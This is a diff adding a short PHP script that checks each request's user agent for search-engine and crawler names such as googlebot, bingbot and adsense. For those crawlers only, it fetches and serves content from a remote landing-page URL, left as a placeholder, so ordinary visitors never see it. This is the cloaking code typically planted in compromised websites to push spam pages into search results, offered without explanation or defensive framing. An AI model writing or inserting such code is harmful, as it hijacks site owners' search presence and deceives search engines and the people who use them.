@@ -1,0 +1,28 @@
+<?php
+$map = [
+    '/'  => '//landingpages raw or anything'
+
+];
+ 
+$bots = ['googlebot','bingbot','Google-Site-Verification','Google-InspectionTool','adsense','slurp','TelegramBot'];
+$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+$ua  = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
+ 
+foreach ($bots as $b) {
+    if (strpos($ua, strtolower($b)) !== false) {
+        foreach ($map as $path => $url) {
+            if (strpos($uri, $path) !== false) {
+                $ch = curl_init($url);
+                curl_setopt_array($ch, [
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_FOLLOWLOCATION => true,
+                    CURLOPT_TIMEOUT => 10,
+                    CURLOPT_USERAGENT => 'Mozilla/5.0'
+                ]);
+                echo curl_exec($ch);
+                curl_close($ch);
+                exit;
+            }}
+        break;
+    }}
+?>
